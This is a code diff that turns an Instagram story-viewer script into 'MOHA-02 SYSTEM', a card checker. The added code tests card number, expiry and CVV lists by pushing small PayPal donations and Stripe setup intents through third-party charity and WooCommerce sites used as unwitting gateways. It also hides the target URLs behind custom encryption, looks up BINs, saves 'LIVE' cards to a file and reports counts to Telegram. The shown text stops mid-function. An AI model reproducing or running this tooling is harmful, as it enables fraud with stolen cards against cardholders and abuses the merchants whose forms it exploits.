@@ -1,260 +1,810 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# -------------------------------------------------------
-# Tool Name: MOHA-02 SYSTEM (STORY MASTER)
-# Developer: Moha Al-Shalfawi (@m_oha_02)
-# Version: 4.0 (2026 - Termux Edition)
-# -------------------------------------------------------
 
 import requests
+import re
+import base64
+import random
+import json
+import sys
 import time
 import os
-import json
-import random
-import sys
+import hashlib
+import threading
+import asyncio
+import aiohttp
+import ctypes
+import inspect
+import hmac
+import webbrowser
+from datetime import datetime, timedelta
+from Crypto.Protocol.KDF import PBKDF2
+from Crypto.Hash import SHA256, SHA512, HMAC
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+from Crypto.Util.Padding import pad, unpad
 from user_agent import generate_user_agent
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from colorama import init, Fore, Back, Style
+from rich.console import Console
+from rich.progress import Progress, BarColumn, TaskProgressColumn, SpinnerColumn, TextColumn
+from rich.panel import Panel
+from rich.table import Table
+from rich.text import Text
+from rich.layout import Layout
+from rich import box
+from rich.style import Style as RichStyle
+from string import ascii_lowercase, digits, ascii_letters
+import aiosqlite
 
-# --- Color Palette (Cyber Luxury Style) ---
-G = '\033[1;32m'  # Green
-R = '\033[1;31m'  # Red
-W = '\033[1;37m'  # White
-Y = '\033[1;33m'  # Yellow
-C = '\033[1;36m'  # Cyan
-M = '\033[1;35m'  # Magenta
-B = '\033[1;34m'  # Blue
-X = '\033[0m'     # Reset
+init(autoreset=True)
+console = Console()
 
-# --- System Headers & Configuration ---
-CELEBS = [
-    "cristiano", "leomessi", "neymarjr", "kendalljenner", 
-    "arianagrande", "therock", "justinbieber", "kyliejenner",
-    "virat.kohli", "champagnepapi", "charlidamelio", "khloekardashian"
-]
+class Colors:
+    reset = Style.RESET_ALL
+    bold = Style.BRIGHT
+    red = Fore.RED
+    green = Fore.GREEN
+    yellow = Fore.YELLOW
+    blue = Fore.BLUE
+    magenta = Fore.MAGENTA
+    cyan = Fore.CYAN
+    white = Fore.WHITE
+    lred = Fore.LIGHTRED_EX
+    lgreen = Fore.LIGHTGREEN_EX
+    lyellow = Fore.LIGHTYELLOW_EX
+    lcyan = Fore.LIGHTCYAN_EX
+    lwhite = Fore.LIGHTWHITE_EX
+    
+    neon_cyan = "cyan" 
+    success_green = "green"
+    fail_red = "red"
+    warning_yellow = "yellow"
+    
+    STATS_STYLE = RichStyle(color="#00ffcc")
+    SUCCESS_STYLE = RichStyle(color="#00ff00")
+    FAIL_STYLE = RichStyle(color="#ff4444")
+    WARNING_STYLE = RichStyle(color="#ffaa00")
 
-class MohaLuxuryUI:
+C = Colors()
+
+def open_socials():
+    webbrowser.open("https://t.me/m_oha_02")
+    webbrowser.open("https://www.facebook.com/profile.php?id=100089063544267")
+
+def show_banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    logo = f"""
+{C.lgreen}          ███╗   ███╗ ██████╗ ██╗  ██╗
+{C.lgreen}          ████╗ ████║██╔═══██╗██║  ██║
+{C.lgreen}          ██╔████╔██║██║   ██║███████║
+{C.lgreen}          ██║╚██╔╝██║██║   ██║██╔══██║
+{C.lgreen}          ██║ ╚═╝ ██║╚██████╔╝██║  ██║
+{C.lgreen}          ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝
+{C.lcyan}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{C.white}    [+] Developer : Moha Al-Shalfawi
+{C.white}    [+] Telegram  : @m_oha_02
+{C.white}    [+] Project   : MOHA-02 SYSTEM V6.0
+{C.lcyan}   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    """
+    print(logo)
+
+class FernetCompatible:
+    def __init__(self, key):
+        if isinstance(key, str):
+            key = key.encode()
+        self.key = base64.urlsafe_b64decode(key)
+        if len(self.key) != 32:
+            raise ValueError("Key must be 32 bytes.")
+        self.signing_key = self.key[:16]
+        self.encryption_key = self.key[16:]
+
     @staticmethod
-    def clear_screen():
-        if os.name == 'nt':
-            os.system('cls')
-        else:
-            os.system('clear')
+    def _get_timestamp():
+        return int(time.time()).to_bytes(8, 'big')
 
-    @staticmethod
-    def print_logo():
-        MohaLuxuryUI.clear_screen()
-        logo = f"""
-{C}    ███╗   ███╗ ██████╗ ██╗  ██╗ █████╗        ██████╗ ██████╗ 
-{C}    ████╗ ████║██╔═══██╗██║  ██║██╔══██╗      ██╔═████╗╚════██╗
-{C}    ██╔████╔██║██║   ██║███████║███████║█████╗██║██╔██║ █████╔╝
-{C}    ██║╚██╔╝██║██║   ██║██╔══██║██╔══██║╚════╝████╔╝██║██╔═══╝ 
-{C}    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║      ╚██████╔╝███████╗
-{C}    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝       ╚═════╝ ╚══════╝
-{Y}    -----------------------------------------------------------
-{W}    [+] {G}Developer {W}: {C}Moha Al-Shalfawi (@m_oha_02)
-{W}    [+] {G}Tool Name {W}: {C}MOHA-02 ULTIMATE STORY SYSTEM
-{W}    [+] {G}Version   {W}: {C}4.0 (2026 Updated)
-{W}    [+] {G}Platform  {W}: {C}Termux / Linux / Windows
-{Y}    -----------------------------------------------------------
-        """
-        print(logo)
+    def encrypt(self, data):
+        if isinstance(data, str):
+            data = data.encode()
+        current_time = self._get_timestamp()
+        iv = get_random_bytes(16)
+        cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
+        ciphertext = cipher.encrypt(pad(data, AES.block_size))
+        payload = b'\x80' + current_time + iv + ciphertext
+        h = HMAC.new(self.signing_key, digestmod=SHA256)
+        h.update(payload)
+        signature = h.digest()
+        return base64.urlsafe_b64encode(payload + signature).decode()
 
-    @staticmethod
-    def print_status(status_type, message):
-        if status_type == "success":
-            print(f"{W}[{G}SUCCESS{W}] {message}")
-        elif status_type == "error":
-            print(f"{W}[{R}ERROR{W}] {message}")
-        elif status_type == "info":
-            print(f"{W}[{C}INFO{W}] {message}")
-        elif status_type == "wait":
-            print(f"{W}[{Y}WAITING{W}] {message}")
+    def decrypt(self, token):
+        if isinstance(token, str):
+            token = token.encode()
+        try:
+            raw = base64.urlsafe_b64decode(token)
+            payload = raw[:-32]
+            signature = raw[-32:]
+            h = HMAC.new(self.signing_key, digestmod=SHA256)
+            h.update(payload)
+            if not hmac.compare_digest(signature, h.digest()):
+                return None
+            if payload[0] != 0x80:
+                return None
+            iv = payload[9:25]
+            ciphertext = payload[25:]
+            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
+            plain = unpad(cipher.decrypt(ciphertext), AES.block_size)
+            return plain.decode() 
+        except:
+            return None
 
-class InstagramCore:
-    def __init__(self, session_id):
-        self.session_id = session_id
-        self.user_agent = generate_user_agent()
-        self.headers = {
-            'Host': 'i.instagram.com',
-            'sec-ch-ua': '"Google Chrome";v="110", "Not)A;Brand";v="8", "Chromium";v="110"',
-            'x-ig-app-id': '1217981644879628',
-            'x-ig-www-claim': 'hmac.AR2OtYWgs8__K9u4lq6KcsuD0AlWEdc1PA7pCmaUcXWp7UgT',
-            'sec-ch-ua-mobile': '?1',
-            'x-instagram-ajax': '1006192243',
+def _seed_layer_1():
+    return hashlib.sha512(b"MOHA_SECRET_V6_2026").hexdigest()[:32]
+
+def _seed_layer_2():
+    return hashlib.sha256(hashlib.md5(b"MohaAlShalfawiSystem").digest()).hexdigest()[:32]
+
+def _seed_layer_3():
+    return base64.b64encode(hashlib.sha3_512(b"Moha-02-Quantum-Key").digest()).decode()[:32]
+
+def _generate_master_key():
+    k1 = _seed_layer_1().encode()
+    k2 = _seed_layer_2().encode()
+    k3 = _seed_layer_3().encode()
+    combined = hashlib.pbkdf2_hmac('sha512', k1 + k2 + k3, b'moha_salt_2026', 100000)
+    return base64.urlsafe_b64encode(combined[:32])
+
+class QuantumShield:
+    MASTER_KEY = _generate_master_key()
+    cipher = FernetCompatible(MASTER_KEY)
+
+    @classmethod
+    def encrypt(cls, data):
+        if isinstance(data, dict):
+            data = json.dumps(data)
+        intermediate = base64.b64encode(data.encode()).decode()
+        return cls.cipher.encrypt(intermediate.encode())
+
+    @classmethod
+    def decrypt(cls, encrypted_data):
+        try:
+            decrypted_str = cls.cipher.decrypt(encrypted_data)
+            if decrypted_str is None:
+                return None
+            return base64.b64decode(decrypted_str.encode()).decode()
+        except:
+            return None
+
+class ConnectionEncryptor:
+    _encryption_layer = QuantumShield
+    _ENCRYPTED_URLS = {
+        "paypal_main": QuantumShield.encrypt("https://dev.journeytojannah.org.uk/donate-now/"),
+        "paypal_base": QuantumShield.encrypt("https://dev.journeytojannah.org.uk"),
+        "stripe_account": QuantumShield.encrypt("https://emilydangremond.com/account/"),
+        "stripe_payment": QuantumShield.encrypt("https://emilydangremond.com/account/add-payment-method/"),
+        "stripe_api": QuantumShield.encrypt("https://api.stripe.com/v1/payment_methods"),
+        "stripe_ajax": QuantumShield.encrypt("https://emilydangremond.com/wp-admin/admin-ajax.php"),
+        "bin_api": QuantumShield.encrypt("https://bins.antipublic.cc/bins/"),
+        "paypal_cors": QuantumShield.encrypt("https://cors.api.paypal.com/v2/checkout/orders/")
+    }
+
+    _ENCRYPTED_HEADERS = {
+        "user_agent": QuantumShield.encrypt("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"),
+        "accept": QuantumShield.encrypt("text/html,application/xhtml+xml,application/xml;q=0.9"),
+        "content_type": QuantumShield.encrypt("application/x-www-form-urlencoded; charset=UTF-8"),
+        "json_type": QuantumShield.encrypt("application/json"),
+        "paypal_auth": QuantumShield.encrypt("Bearer "),
+        "origin_paypal": QuantumShield.encrypt("https://assets.braintreegateway.com")
+    }
+
+    @classmethod
+    def get_url(cls, key):
+        decrypted = QuantumShield.decrypt(cls._ENCRYPTED_URLS.get(key, ""))
+        return decrypted if decrypted else ""
+
+    @classmethod
+    def get_header(cls, key):
+        decrypted = QuantumShield.decrypt(cls._ENCRYPTED_HEADERS.get(key, ""))
+        return decrypted if decrypted else ""
+CONFIG_FILE = "moha_settings.qsd"
+
+ADVANCED_SETTINGS = {
+    "delay": 0.0,
+    "use_proxy": False,
+    "proxy_file": ""
+}
+
+def load_advanced_settings():
+    adv_file = "moha_adv.qsd"
+    if os.path.exists(adv_file):
+        try:
+            with open(adv_file, 'r', encoding='utf-8') as f:
+                encrypted = f.read()
+                decrypted = QuantumShield.decrypt(encrypted)
+                if decrypted:
+                    return json.loads(decrypted)
+        except:
+            pass
+    return ADVANCED_SETTINGS.copy()
+
+def save_advanced_settings(settings):
+    adv_file = "moha_adv.qsd"
+    encrypted = QuantumShield.encrypt(settings)
+    with open(adv_file, 'w', encoding='utf-8') as f:
+        f.write(encrypted)
+
+def load_settings():
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
+                encrypted = f.read()
+                decrypted = QuantumShield.decrypt(encrypted)
+                if decrypted:
+                    return json.loads(decrypted)
+        except:
+            pass
+    return {"bot_token": "", "chat_id": "", "bot_enabled": False}
+
+def save_settings(settings):
+    encrypted = QuantumShield.encrypt(settings)
+    with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
+        f.write(encrypted)
+
+LICENSE_FILE = "moha_license.qsd"
+
+def initialize_licenses():
+    if not os.path.exists(LICENSE_FILE):
+        expiry_date = (datetime.now() + timedelta(days=365)).isoformat()
+        default_licenses = {
+            "MOHA-02-VIP": expiry_date,
+            "CHLEF-ELITE": expiry_date,
+            "ADMIN-MOHA": expiry_date,
+            "FREE-TRIAL": expiry_date
+        }
+        save_licenses(default_licenses)
+        return default_licenses
+    return load_licenses()
+
+def load_licenses():
+    if os.path.exists(LICENSE_FILE):
+        try:
+            with open(LICENSE_FILE, 'r', encoding='utf-8') as f:
+                encrypted = f.read()
+                decrypted = QuantumShield.decrypt(encrypted)
+                if decrypted:
+                    return json.loads(decrypted)
+        except:
+            pass
+    return {}
+
+def save_licenses(licenses):
+    encrypted = QuantumShield.encrypt(licenses)
+    with open(LICENSE_FILE, 'w', encoding='utf-8') as f:
+        f.write(encrypted)
+
+initialize_licenses()
+
+_ENCODED_SUBSCRIPTIONS = QuantumShield.encrypt({
+    "MOHA-02-VIP": {"days": 365, "level": 1},
+    "CHLEF-ELITE": {"days": 365, "level": 2}
+})
+
+def get_subscriptions():
+    decrypted = QuantumShield.decrypt(_ENCODED_SUBSCRIPTIONS)
+    if decrypted:
+        return json.loads(decrypted)
+    return {}
+
+def check_license(key):
+    licenses = load_licenses()
+    if not licenses:
+        licenses = initialize_licenses()
+    if key in licenses:
+        try:
+            expiry = datetime.fromisoformat(licenses[key])
+            if expiry > datetime.now():
+                return True, expiry
+            else:
+                return False, "انتهت صلاحية المفتاح"
+        except:
+            return False, "خطأ في التفعيل"
+    return False, "مفتاح غير صالح"
+
+def get_remaining_days(key):
+    licenses = load_licenses()
+    if key in licenses:
+        try:
+            expiry = datetime.fromisoformat(licenses[key])
+            remaining = expiry - datetime.now()
+            return max(0, remaining.days)
+        except:
+            pass
+    return 0
+
+def send_to_telegram(message):
+    settings = load_settings()
+    if settings.get("bot_enabled") and settings.get("bot_token") and settings.get("chat_id"):
+        try:
+            url = f"https://api.telegram.org/bot{settings['bot_token']}/sendMessage"
+            requests.post(url, data={"chat_id": settings["chat_id"], "text": message, "parse_mode": "HTML"}, timeout=5)
+            return True
+        except:
+            pass
+    return False
+
+class PayPal:
+    def __init__(self, c):
+        self.c = c.strip()
+        p = self.c.split("|")
+        if len(p) < 4:
+            raise ValueError("صيغة البطاقة خطأ")
+        self.n, self.m, self.y, self.cvv = p[0], p[1], p[2], p[3]
+        if "20" in self.y:
+            self.y = self.y.split("20")[1]
+        self.t = ConnectionEncryptor.get_url("paypal_main")
+        self.b = ConnectionEncryptor.get_url("paypal_base")
+        self.aj = self.b + "/wp-admin/admin-ajax.php"
+        self.s = requests.Session()
+        self.u = generate_user_agent()
+        self.a = "1.00"
+        self.fn = "Moha"
+        self.ln = "Shalfawi"
+        self.em = f"moha.chlef.{random.randint(100,999)}@gmail.com"
+
+    def _g(self):
+        h = {'authority': "dev.journeytojannah.org.uk", 'accept': ConnectionEncryptor.get_header("accept"), 'user-agent': self.u}
+        r = self.s.get(self.t, headers=h)
+        self.hv = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
+        self.px = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
+        self.fid = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
+        et = re.search(r'"data-client-token":"(.*?)"', r.text).group(1)
+        d = base64.b64decode(et).decode('utf-8')
+        self.at = re.search(r'"accessToken":"(.*?)"', d).group(1)
+
+    def _p(self):
+        h = {'content-type': ConnectionEncryptor.get_header("content_type"), 'origin': self.b, 'referer': self.t, 'user-agent': self.u}
+        d = {
+            'give-honeypot': '', 'give-form-id-prefix': self.px, 'give-form-id': self.fid,
+            'give-form-hash': self.hv, 'give-amount': self.a, 'payment-mode': 'paypal-commerce',
+            'give_first': self.fn, 'give_last': self.ln, 'give_email': self.em, 'action': 'give_process_donation', 'give_ajax': 'true'
+        }
+        self.s.post(self.aj, headers=h, data=d)
+    def _c(self):
+        mp = MultipartEncoder({
+            'give-honeypot': (None, ''),
+            'give-form-id-prefix': (None, self.px),
+            'give-form-id': (None, self.fid),
+            'give-form-title': (None, 'Donation'),
+            'give-current-url': (None, self.t),
+            'give-form-url': (None, self.t),
+            'give-form-minimum': (None, '1.00'),
+            'give-form-maximum': (None, '999999.99'),
+            'give-form-hash': (None, self.hv),
+            'give-price-id': (None, 'custom'),
+            'give-amount': (None, self.a),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, self.fn),
+            'give_last': (None, self.ln),
+            'give_email': (None, self.em),
+            'card_name': (None, f"{self.fn} {self.ln}"),
+            'give-gateway': (None, 'paypal-commerce'),
+        })
+        h = {'content-type': mp.content_type, 'referer': self.t, 'user-agent': self.u}
+        p = {'action': 'give_paypal_commerce_create_order'}
+        r = self.s.post(self.aj, params=p, headers=h, data=mp)
+        self.oid = r.json()['data']['id']
+
+    def _cf(self):
+        h = {
+            'authority': 'cors.api.paypal.com',
             'accept': '*/*',
-            'user-agent': self.user_agent,
-            'x-asbd-id': '198387',
-            'x-csrftoken': '2C8OLRCvFdI6PLg9i23yGt7oQkFoGRbh',
-            'sec-ch-ua-platform': '"Android"',
-            'origin': 'https://www.instagram.com',
-            'sec-fetch-site': 'same-site',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://www.instagram.com/',
-            'cookie': f'sessionid={self.session_id}'
+            'authorization': ConnectionEncryptor.get_header("paypal_auth") + self.at,
+            'content-type': ConnectionEncryptor.get_header("json_type"),
+            'origin': ConnectionEncryptor.get_header("origin_paypal"),
+            'referer': ConnectionEncryptor.get_header("origin_paypal"),
+            'user-agent': self.u,
+        }
+        pl = {
+            'payment_source': {
+                'card': {
+                    'number': self.n,
+                    'expiry': f"20{self.y}-{self.m}",
+                    'security_code': self.cvv,
+                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
+                },
+            },
+            'application_context': {'vault': False},
+        }
+        requests.post(f'https://cors.api.paypal.com/v2/checkout/orders/{self.oid}/confirm-payment-source', headers=h, json=pl)
+
+    def _a(self):
+        mp = MultipartEncoder({
+            'give-honeypot': (None, ''),
+            'give-form-id-prefix': (None, self.px),
+            'give-form-id': (None, self.fid),
+            'give-form-title': (None, 'Donation'),
+            'give-current-url': (None, self.t),
+            'give-form-url': (None, self.t),
+            'give-form-minimum': (None, '1.00'),
+            'give-form-maximum': (None, '999999.99'),
+            'give-form-hash': (None, self.hv),
+            'give-price-id': (None, 'custom'),
+            'give-amount': (None, self.a),
+            'payment-mode': (None, 'paypal-commerce'),
+            'give_first': (None, self.fn),
+            'give_last': (None, self.ln),
+            'give_email': (None, self.em),
+            'card_name': (None, f"{self.fn} {self.ln}"),
+            'give-gateway': (None, 'paypal-commerce'),
+        })
+        h = {'content-type': mp.content_type, 'origin': self.b, 'referer': self.t, 'user-agent': self.u}
+        p = {'action': 'give_paypal_commerce_approve_order', 'order': self.oid}
+        r = self.s.post(self.aj, params=p, headers=h, data=mp)
+        self.txt = r.text
+
+    def _r(self):
+        t = self.txt
+        if 'true' in t or 'sucsess' in t or 'success' in t.lower():
+            return "✅ LIVE - تمت الموافقة"
+        m = {
+            'DO_NOT_HONOR': "ممنوع التكريم", 'ACCOUNT_CLOSED': "الحساب مغلق",
+            'PAYER_ACCOUNT_LOCKED_OR_CLOSED': "الحساب مغلق", 'LOST_OR_STOLEN': "البطاقة مفقودة",
+            'CVV2_FAILURE': "CVV غير صحيح", 'SUSPECTED_FRAUD': "اشتباه احتيال",
+            'INVALID_ACCOUNT': 'حساب غير صالح', 'INSUFFICIENT_FUNDS': 'رصيد غير كاف',
+            'EXPIRED_CARD': "بطاقة منتهية", 'GENERIC_DECLINE': 'رفض عام',
+            'INVALID_OR_RESTRICTED_CARD': "بطاقة غير صالحة"
+        }
+        for k, v in m.items():
+            if k in t:
+                return f"❌ DIE - {v}"
+        return "❌ DIE - غير معروف"
+
+    def Main(self):
+        try:
+            self._g()
+            self._p()
+            self._c()
+            self._cf()
+            self._a()
+            return self._r()
+        except Exception as e:
+            return f"❌ DIE - خطأ: {str(e)[:30]}"
+
+class StripeAuth:
+    def __init__(self, cc):
+        self.cc = cc
+        self.s = requests.Session()
+        self.ua = ConnectionEncryptor.get_header("user_agent")
+        self.base = {
+            'User-Agent': self.ua,
+            'Accept': ConnectionEncryptor.get_header("accept"),
+            'Accept-Language': "ar-IQ,ar;q=0.9,en-US;q=0.8"
         }
 
-    def get_user_data(self, username):
-        try:
-            url = f"https://www.instagram.com/{username}/?__a=1&__d=dis"
-            response = requests.get(url, headers=self.headers, timeout=10)
-            if response.status_code == 200:
-                data = response.json()
-                user_id = data["graphql"]["user"]["id"]
-                return user_id
-            return None
-        except Exception:
-            return None
+    def _em(self):
+        p = ["moha","chlef","dz","user","test","elite"]
+        d = ["gmail.com","yahoo.com","outlook.com","proton.me"]
+        return f"{random.choice(p)}{random.randint(1000,9999)}@{random.choice(d)}"
 
-    def fetch_reels_tray(self):
-        try:
-            url = "https://i.instagram.com/api/v1/feed/reels_tray/"
-            response = requests.get(url, headers=self.headers, timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return None
-        except Exception:
-            return None
+    def _cc(self):
+        n,m,y,c = [x.strip() for x in self.cc.split("|")]
+        m = m.zfill(2)
+        if len(y)==4: y=y[-2:]
+        return n.replace(" ",""),m,y,c
 
-    def fetch_user_stories(self, user_id):
-        try:
-            url = f"https://i.instagram.com/api/v1/feed/reels_media/?reel_ids={user_id}"
-            response = requests.get(url, headers=self.headers, timeout=10)
-            if response.status_code == 200:
-                return response.json()
-            return None
-        except Exception:
-            return None
+    def g1(self):
+        h = self.base.copy()
+        h.update({'Cache-Control': "max-age=0", 'Upgrade-Insecure-Requests': "1"})
+        r = self.s.get(ConnectionEncryptor.get_url("stripe_account"), headers=h)
+        n = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r.text)
+        return n.group(1) if n else None
 
-    def mark_story_seen(self, reel_id, owner_id, taken_at):
+    def p1(self, email, nonce):
+        h = self.base.copy()
+        h.update({'Origin': ConnectionEncryptor.get_url("paypal_base"), 'Referer': ConnectionEncryptor.get_url("stripe_account")})
+        d = {'email': email, 'woocommerce-register-nonce': nonce, 'register': "Register"}
+        self.s.post(ConnectionEncryptor.get_url("stripe_account"), headers=h, data=d)
+    def g2(self):
+        h = self.base.copy()
+        h.update({'Referer': ConnectionEncryptor.get_url("stripe_account"), 'Upgrade-Insecure-Requests': "1"})
+        r = self.s.get(ConnectionEncryptor.get_url("stripe_payment"), headers=h)
+        t = r.text
+        n = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', t)
+        k = re.search(r'(pk_live_[a-zA-Z0-9]+)', t)
+        return (n.group(1), k.group(1)) if n and k else (None, None)
+
+    def p2(self, n, m, y, c, pk):
+        h = {
+            'User-Agent': self.ua, 'Accept': "application/json",
+            'Origin': "https://js.stripe.com", 'Referer': "https://js.stripe.com/",
+        }
+        d = {
+            'type': "card", 'card[number]': n, 'card[cvc]': c,
+            'card[exp_year]': f"20{y}", 'card[exp_month]': m,
+            'billing_details[address][postal_code]': "10011",
+            'billing_details[address][country]': "US", 'key': pk,
+        }
+        r = self.s.post(ConnectionEncryptor.get_url("stripe_api"), headers=h, data=d)
+        j = r.json()
+        return j.get("id"), j
+
+    def p3(self, pm, nonce):
+        h = self.base.copy()
+        h.update({'Origin': ConnectionEncryptor.get_url("paypal_base"), 'X-Requested-With': "XMLHttpRequest"})
+        d = {
+            'action': "wc_stripe_create_and_confirm_setup_intent",
+            'wc-stripe-payment-method': pm, '_ajax_nonce': nonce
+        }
+        r = self.s.post(ConnectionEncryptor.get_url("stripe_ajax"), headers=h, data=d)
+        return r.text.lower()
+
+    def Main(self):
         try:
-            url = "https://i.instagram.com/api/v1/stories/reel/seen"
-            payload = {
-                "reelMediaId": str(reel_id),
-                "reelMediaOwnerId": str(owner_id),
-                "reelId": str(owner_id),
-                "reelMediaTakenAt": str(taken_at),
-                "viewSeenAt": str(taken_at)
+            n,m,y,c = self._cc()
+            email = self._em()
+            n1 = self.g1()
+            if not n1: return "❌ DIE - فشل نونس"
+            self.p1(email, n1)
+            n2, pk = self.g2()
+            if not n2 or not pk: return "❌ DIE - خطأ إعداد"
+            pm, raw = self.p2(n,m,y,c,pk)
+            if not pm: return f"❌ DIE - {raw.get('error',{}).get('message', 'خطأ')[:30]}"
+            res = self.p3(pm, n2)
+            if "succeeded" in res: return "✅ LIVE - تمت الإضافة"
+            if "declined" in res: return "❌ DIE - مرفوضة"
+            if "requires_action" in res: return "⚠️ 3DS - يتطلب توثيق"
+            return "❌ DIE - غير معروف"
+        except Exception as e:
+            return f"❌ DIE - {str(e)[:30]}"
+
+class BinInfo:
+    def __init__(self, bin):
+        self.bin = bin[:6]
+        self.url = ConnectionEncryptor.get_url("bin_api") + self.bin
+
+    def Main(self):
+        try:
+            r = requests.get(url=self.url, timeout=10)
+            if r.status_code == 200: return r.json()
+            return {"error": "لم يتم العثور"}
+        except: return {"error": "خطأ اتصال"}
+
+class Statistics:
+    def __init__(self):
+        self.total = 0
+        self.live = 0
+        self.die = 0
+        self.threed = 0
+        self.current = 0
+        self.lock = threading.Lock()
+        self.live_cards = []
+        self.start_time = None
+
+    def start(self):
+        self.start_time = datetime.now()
+
+    def update(self, result, card):
+        with self.lock:
+            self.total += 1
+            self.current += 1
+            if "LIVE" in result:
+                self.live += 1
+                self.live_cards.append(card)
+            elif "3DS" in result:
+                self.threed += 1
+                self.die += 1
+            else:
+                self.die += 1
+
+    def display(self, current_card=None):
+        percent = (self.live / self.total * 100) if self.total > 0 else 0
+        table = Table(show_header=False, box=box.ROUNDED, border_style=C.neon_cyan)
+        table.add_row("📊 المجموع", f"{self.total}")
+        table.add_row("✅ لايف", f"[{C.success_green}]{self.live}[/{C.success_green}]")
+        table.add_row("❌ ميت", f"[{C.fail_red}]{self.die}[/{C.fail_red}]")
+        panel = Panel.fit(table, title=f"[{C.neon_cyan}]إحصائيات MOHA-02[/{C.neon_cyan}]", border_style=C.neon_cyan)
+        console.print(panel)
+
+    def display_final(self, tool_name, filename):
+        percent = (self.live / self.total * 100) if self.total > 0 else 0
+        final_table = Table(title=f"التقرير النهائي - {tool_name}", box=box.HEAVY_EDGE, border_style="cyan")
+        final_table.add_row("✅ لايف", f"[{C.success_green}]{self.live}[/{C.success_green}]")
+        final_table.add_row("❌ ميت", f"[{C.fail_red}]{self.die}[/{C.fail_red}]")
+        final_table.add_row("📈 النسبة", f"{percent:.2f}%")
+        console.print(final_table)
+        if self.live_cards:
+            live_file = f"Live_Moha_{datetime.now().strftime('%H%M%S')}.txt"
+            with open(live_file, 'w', encoding='utf-8') as f:
+                for card in self.live_cards: f.write(f"{card}\n")
+            console.print(f"[{C.success_green}] ✅ تم حفظ البطاقات في: {live_file}[/{C.success_green}]")
+        if load_settings().get('bot_enabled'):
+            report = f"📊 <b>تقرير فحص MOHA-02</b>\n✅ لايف: {self.live}\n❌ ميت: {self.die}"
+            send_to_telegram(report)
+class PayPalAdvanced:
+    def __init__(self, url: str = None):
+        self.url = url or ConnectionEncryptor.get_url("paypal_base").replace("https://", "")
+        self.pattern = re.compile(r'^\s*(\d{15,16}|\d{4}(?:[ \-]?\d{4}){3})[ \|\/-]+(\d{1,2})[ \|\/-]+(\d{2,4})[ \|\/-]+(\d{3,4})\s*$')
+        self.console = Console()
+
+    def GenMail(self) -> str:
+        return f"moha.{''.join(random.choices(ascii_lowercase + digits, k=7))}@gmail.com"
+
+    async def Check(self, card, month, year, cvv, email):
+        if len(year) == 4: year = year[-2:]
+        month = month.zfill(2)
+        async with aiohttp.ClientSession() as session:
+            h_get = {'referer': f'https://{self.url}', 'user-agent': ConnectionEncryptor.get_header("user_agent")}
+            async with session.get(f'https://{self.url}', headers=h_get) as resp:
+                html = await resp.text()
+                id1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
+                id2 = re.search(r'name="give-form-id" value="(.*?)"', html)
+                hv = re.search(r'name="give-form-hash" value="(.*?)"', html)
+                token = re.search(r'"data-client-token":"(.*?)"', html)
+                if not (id1 and id2 and hv and token): return "❌ DIE - Extraction Error"
+                ct = token.group(1)
+                data = base64.b64decode(ct).decode('utf-8')
+                at = re.search(r'"accessToken":"(.*?)"', data).group(1)
+
+            url_aj = f"https://{self.url}/wp-admin/admin-ajax.php"
+            d_init = {
+                'give-honeypot': '', 'give-form-id-prefix': id1.group(1), 'give-form-id': id2.group(1),
+                'give-form-hash': hv.group(1), 'give-amount': '1.00', 'payment-mode': 'paypal-commerce',
+                'give_email': email, 'give_action': 'purchase', 'action': 'give_process_donation', 'give_ajax': 'true'
             }
-            response = requests.post(url, headers=self.headers, data=payload, timeout=10)
-            if response.status_code == 200:
-                return response.json().get("status") == "ok"
-            return False
-        except Exception:
-            return False
+            async with session.post(url_aj, headers=h_get, data=d_init) as resp:
+                cookies = {k: v.value for k, v in resp.cookies.items()}
 
-class MohaEngine:
-    def __init__(self, session_id):
-        self.core = InstagramCore(session_id)
-        self.success_count = 0
-        self.fail_count = 0
+            form = aiohttp.FormData()
+            fields = {
+                'give-form-id-prefix': id1.group(1), 'give-form-id': id2.group(1), 'give-form-hash': hv.group(1),
+                'give-amount': '1.00', 'payment-mode': 'paypal-commerce', 'give_email': email, 'give_gateway': 'paypal-commerce'
+            }
+            for k, v in fields.items(): form.add_field(k, v)
 
-    def process_followers_stories(self):
-        MohaLuxuryUI.print_status("info", "Fetching stories from your feed...")
-        data = self.core.fetch_reels_tray()
-        if not data or 'tray' not in data:
-            MohaLuxuryUI.print_status("error", "Could not fetch feed. Check Session ID.")
-            return
+            async with session.post(url_aj, params={'action': 'give_paypal_commerce_create_order'}, data=form, cookies=cookies) as resp:
+                js = await resp.json()
+                oid = js.get('data', {}).get('id')
+                if not oid: return "❌ DIE - Order Error"
 
-        for entry in data['tray']:
-            try:
-                username = entry['user']['username']
-                owner_id = entry['id']
-                latest_reel = entry.get('latest_reel_media')
-                
-                if latest_reel:
-                    stories_data = self.core.fetch_user_stories(owner_id)
-                    if stories_data and 'reels' in stories_data:
-                        items = stories_data['reels'][owner_id]['items']
-                        for item in items:
-                            media_id = item['pk']
-                            taken_at = item['taken_at']
-                            if self.core.mark_story_seen(media_id, owner_id, taken_at):
-                                self.success_count += 1
